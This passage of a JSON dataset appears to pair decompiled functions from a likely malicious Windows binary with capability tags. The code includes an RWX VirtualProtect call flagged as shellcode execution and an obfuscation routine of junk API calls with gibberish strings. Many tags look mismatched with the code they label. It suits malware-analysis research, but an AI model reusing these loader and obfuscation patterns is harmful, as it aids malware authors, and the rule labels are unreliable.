        "decompiled_code": "\nvoid __cdecl fcn.00407f10(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00407eb4(fcn.004083a8, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "00407f2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407f2b(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00407eb4(fcn.004102f7, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "00407f45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407f45(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00407eb4(fcn.004102f7, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "00407ffc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407ffc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040804b(fcn.004083a8, arg_8h, arg_ch, arg_10h, 0, arg_14h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 108
    },
    "00408023": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408023(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040804b(fcn.004083a8, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "00408233": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408233(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040804b(fcn.004102f7, arg_8h, arg_ch, arg_10h, 0, arg_14h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 108
    },
    "0040825a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040825a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040804b(fcn.004102f7, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 117
    },
    "0040a7a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a7a9(void)\n\n{\n    code **ppcVar1;\n    \n    for (ppcVar1 = 0x441530; ppcVar1 < 0x441530; ppcVar1 = ppcVar1 + 1) {\n        if (*ppcVar1 != NULL) {\n            (**ppcVar1)();\n        }\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00412872": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412872(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0041ce43(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "00412889": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412889(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041ce78(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 45
    },
    "0041289f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041289f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0041ce78(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 54
    },
    "004128b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004128b6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0041ce93(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 54
    },
    "00412991": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412991(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f69a();\n    fcn.0040f749(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 55
    },
    "004129a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004129a4(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041ce93(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 46
    },
    "004172b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004172b5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00417593(arg_8h, arg_ch, arg_10h, 0x42e2c4);\n    return arg_8h;\n}\n",
        "token_count": 65
    },
    "004172d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004172d3(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00417593(arg_8h, arg_ch, arg_10h, 0x42bb88);\n    return arg_8h;\n}\n",
        "token_count": 63
    },
    "0041ce43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ce43(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0041cec8(fcn.004083a8, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "0041ce5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ce5e(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041cec8(fcn.004102f7, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "0041ce78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ce78(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0041cec8(fcn.004102f7, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "0041ce93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ce93(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0041cec8(fcn.00411765, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "0041ceae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ceae(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041cec8(fcn.004083a8, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 53
    },
    "0041cec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0041cec8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00409270(0x441d58, 0x10);\n    iVar1 = fcn.0040f69a();\n    iVar1 = iVar1 + 0x20;\n    *(unaff_EBP + -0x20) = iVar1;\n    *(unaff_EBP + -0x1c) = 0;\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar2 = fcn.00409004();\n        *puVar2 = 0x16;\n        fcn.00407cd0();\n    }\n    else {\n        fcn.0040f6a0(iVar1);\n        *(unaff_EBP + -4) = 0;\n        arg_8h_00 = fcn.0040c20f(iVar1);\n        uVar3 = (**(unaff_EBP + 8))(iVar1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x1c) = uVar3;\n        fcn.0040c1de(arg_8h_00, iVar1);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0041cf4d();\n    }\n    fcn.004092b5();\n    return;\n}\n",
        "token_count": 449
    },
    "0041cf55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cf55(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041cec8(fcn.00411765, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 52
    },
    "0041d43b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d43b(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041b9f1(arg_8h, 0, 10, arg_ch);\n    return;\n}\n",
        "token_count": 51
    },
    "0041d45b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d45b(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004229ac(arg_8h, 0, 10, arg_ch);\n    return;\n}\n",
        "token_count": 48
    },
    "0041d48f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d48f(uint arg_8h)\n\n{\n    fcn.00422982(arg_8h, 0, 10);\n    return;\n}\n",
        "token_count": 41
    },
    "004229ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004229ac(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004226f2(arg_14h, arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 66
    },
    "00422a03": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422a03(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004226f2(arg_14h, arg_8h, arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 67
    },
    "00422a4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422a4f(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00426eff(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "00427350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427350(uint arg_8h)\n\n{\n    fcn.004279f1(arg_8h, 0, 10);\n    return;\n}\n",
        "token_count": 40
    },
    "00427347": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427347(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004279f1(arg_8h, 0, 10);\n    return;\n}\n",
        "token_count": 44
    },
    "00427dce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427dce(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00427a21(arg_14h, arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 67
    },
    "00427e25": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427e25(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00427a21(arg_14h, arg_8h, arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 67
    },
    "00427e67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427e67(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004280da(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "004073e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004073e3(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040e5cd(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "004047ba": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuchar * __thiscall fcn.004047ba(uchar *param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0xf;\n    *param_1 = 0;\n    uVar1 = fcn.004010cb(param_2);\n    fcn.00404908(param_2, uVar1);\n    return param_1;\n}\n",
        "token_count": 109
    },
    "004019f7": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.004019f7(void)\n\n{\n    uchar auStack4 [4];\n    \n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*0x44dc74, *0x451ffc, 0x40, auStack4);\n    return;\n}\n",
        "token_count": 59
    },
    "00402fbb": {
        "rules": [
            "delay execution",
            "query environment variable",
            "get common file path",
            "get disk information",
            "create mailslot"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.00402fbb(void)\n\n{\n    uint uVar1;\n    uint *extraout_ECX;\n    uchar auStack8204 [2048];\n    uint var_1808h;\n    uint var_1408h;\n    uint var_c08h;\n    uint var_408h;\n    uint uStack244;\n    char *pcStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    char *pcStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uchar *puStack196;\n    uint uStack192;\n    uint uStack188;\n    char *pcStack184;\n    char *pcStack180;\n    char16_t *pcStack176;\n    uint *puStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    char *pcStack156;\n    char16_t *pcStack152;\n    char16_t *pcStack148;\n    uint *puStack144;\n    uint uStack140;\n    uint uStack136;\n    char *pcStack132;\n    char *pcStack128;\n    char *pcStack124;\n    char *pcStack120;\n    char *pcStack116;\n    char *pcStack112;\n    char *pcStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    char *pcStack80;\n    uint *puStack76;\n    uint uStack72;\n    uint *puStack68;\n    uint uStack64;\n    uint uStack60;\n    char *pcStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    char *pcStack24;\n    char *pcStack20;\n    char *pcStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x402fc8;\n    fcn.0041b7a0();\n    pcStack16 = \"caxaruvivayu\";\n    pcStack20 = \"watililolopuniwari kadedeyuliwujizo\";\n    pcStack24 = \"yikibeyagajefopawi wipibuhimomitijuxunajaweyada picupidaviwivudonelasoniro\";\n    uStack28 = 0x402fe1;\n    (*_sym.imp.KERNEL32.dll_WriteProfileStringA)();\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0x402feb;\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n    uStack36 = 0;\n    puStack40 = &fcn.00402fbb::var_4h;\n    uStack44 = 0;\n    puStack48 = &fcn.00402fbb::var_1808h;\n    uStack52 = 0;\n    pcStack56 = 0x402fff;\n    (*_sym.imp.KERNEL32.dll_ReadConsoleA)();\n    pcStack56 = \"jolikogivu fecafobakajizimoseyico wubakexacifojoxacisejohuwixitu\";\n    uStack60 = 0;\n    uStack64 = 0;\n    puStack68 = 0x40300c;\n    (*_sym.imp.KERNEL32.dll_OpenEventA)();\n    puStack68 = &fcn.00402fbb::var_8h;\n    uStack72 = 0;\n    puStack76 = &fcn.00402fbb::var_408h;\n    pcStack80 = \"ruyanohufazomepesipuloxu miraza fa kopohasoteluhagopavudadorodaxa vuguwu\";\n    uStack84 = 0x403023;\n    (*_sym.imp.KERNEL32.dll_GetVolumePathNamesForVolumeNameA)();\n    uStack84 = 0;\n    uStack88 = 0;\n    uStack92 = 0;\n    uStack96 = 0x40302c;\n    (*_sym.imp.KERNEL32.dll_EnumTimeFormatsA)();\n    uStack96 = 0;\n    uStack100 = 0;\n    uStack104 = 0;\n    pcStack108 = \"kudaya\";\n    pcStack112 = \"huxojorenotisatetukonepi gegofibakabegiji\";\n    pcStack116 = \"rawuhusoxayahobu\";\n    pcStack120 = 0x403044;\n    (*_sym.imp.KERNEL32.dll_ReplaceFileA)();\n    pcStack120 = \"difowenagefelude si xitekotanesevuxodace kahusosedovanunume\";\n    pcStack124 = \"zitakogelokajicosemomucokukeve gilehocasirecehe sizimutivenacusiribifaranovo razizebi\";\n    pcStack128 = \"sucokedipazujenaba gecipiboxokohukivicajaragagexusa\";\n    pcStack132 = \"xufabe vucirapuhuyipihomoxojoyotuwije\";\n    uStack136 = 0x40305e;\n    (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)();\n    uStack136 = 0;\n    uStack140 = 0x403065;\n    (*_sym.imp.KERNEL32.dll_HeapLock)();\n    uStack140 = 0;\n    puStack144 = &fcn.00402fbb::var_c08h;\n    pcStack148 = L\"bicifazisinuhepowivekugade waditurabedumata gelako podowuwakodowa\";\n    pcStack152 = L\"xocimakumowu disiyinunilukadasosa vapucezelonohugosefimubuhati lakenikelosa nexozano\";\n    pcStack156 = 0x40307d;\n    (*_sym.imp.KERNEL32.dll_GetFirmwareEnvironmentVariableW)();\n    pcStack156 = \"xevevitubecijikogojujuri zotuci cesihakuxukiyawojuganivesikacu wixujoka\";\n    uStack160 = 0;\n    uStack164 = 0;\n    uStack168 = 0x40308a;\n    (*_sym.imp.KERNEL32.dll_SetLocaleInfoA)();\n    uStack168 = 0;\n    puStack172 = &fcn.00402fbb::var_1408h;\n    pcStack176 = L\"renubetutoguvuxuji\";\n    pcStack180 = 0x40309d;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcStack180 = \"nacebutahusozocegubu pufufowecumiboxegafinidehe\";\n    pcStack184 = \"mokinekegohuguyo gafokufiwehiwilejiwanegenokele vumozokepu\";\n    uStack188 = 0;\n    uStack192 = 0x4030ae;\n    (*_sym.imp.KERNEL32.dll_FindResourceA)();\n    uStack192 = 0;\n    puStack196 = &stack0xffffdff4;\n    uStack200 = 0x4030bc;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)();\n    uStack200 = 0;\n    uStack204 = 0;\n    uStack208 = 0x4030c4;\n    (*_sym.imp.KERNEL32.dll_EnumSystemLocalesW)();\n    uStack208 = 0;\n    uStack212 = 0;\n    uStack216 = 0;\n    pcStack220 = \"ruguyurorusodolodabehiwi kihanuxase\";\n    uStack224 = 0x4030d2;\n    (*_sym.imp.KERNEL32.dll_CreateMailslotA)();\n    uStack224 = 0;\n    uStack228 = 0;\n    uStack232 = 0;\n    uStack236 = 0;\n    pcStack240 = 0x4030dc;\n    (*_sym.imp.KERNEL32.dll_HeapReAlloc)();\n    pcStack240 = \"kernel32.dll\";\n    uStack244 = 0x4030e7;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    *extraout_ECX = uVar1;\n    return;\n}\n",
        "token_count": 1923
    },
    "0040af95": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040af95(uint dwMilliseconds)\n\n{\n    (*_sym.imp.KERNEL32.dll_Sleep)(dwMilliseconds);\n    return;\n}\n",
        "token_count": 35
    },
    "00422b81": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00422b81(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_10h == 1) {\n        uVar3 = *arg_8h;\n        uVar1 = *arg_ch;\ncode_r0x004241ce:\n        if (uVar3 == uVar1) {\n            return 0;\n        }\n        return (0 < uVar3 - uVar1) * 2 + -1;\n    }\n    if (arg_10h == 2) {\n        uVar3 = *arg_8h;\n        uVar1 = *arg_ch;\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        goto code_r0x004241ce;\n    }\n    if (arg_10h == 3) {\n        uVar3 = *arg_8h;\n        uVar1 = *arg_ch;\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n        goto code_r0x004241ce;\n    }\n    if (arg_10h == 4) {\n        uVar1 = *arg_ch;\n        uVar3 = *arg_8h;\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 3);\n        uVar1 = *(arg_ch + 3);\n        goto code_r0x004241ce;\n    }\n    if (0x1f < arg_10h) {\n        do {\n            if (*arg_8h == *arg_ch) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = *arg_8h & 0xff;\n                uVar1 = *arg_ch;\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 1);\n                uVar1 = *(arg_ch + 1);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 2);\n                uVar1 = *(arg_ch + 2);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 3) - *(arg_ch + 3);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[1] == arg_ch[1]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[1] & 0xff;\n                uVar1 = *(arg_ch + 1);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 5);\n                uVar1 = *(arg_ch + 5);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 6);\n                uVar1 = *(arg_ch + 6);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 7) - *(arg_ch + 7);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[2] == arg_ch[2]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[2] & 0xff;\n                uVar1 = *(arg_ch + 2);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 9);\n                uVar1 = *(arg_ch + 9);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 10);\n                uVar1 = *(arg_ch + 10);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[3] == arg_ch[3]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[3] & 0xff;\n                uVar1 = *(arg_ch + 3);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0xd);\n                uVar1 = *(arg_ch + 0xd);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0xe);\n                uVar1 = *(arg_ch + 0xe);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[4] == arg_ch[4]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar1 = *(arg_ch + 4);\n                uVar3 = *(arg_8h + 4);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x11);\n                uVar1 = *(arg_ch + 0x11);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x12);\n                uVar1 = *(arg_ch + 0x12);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return 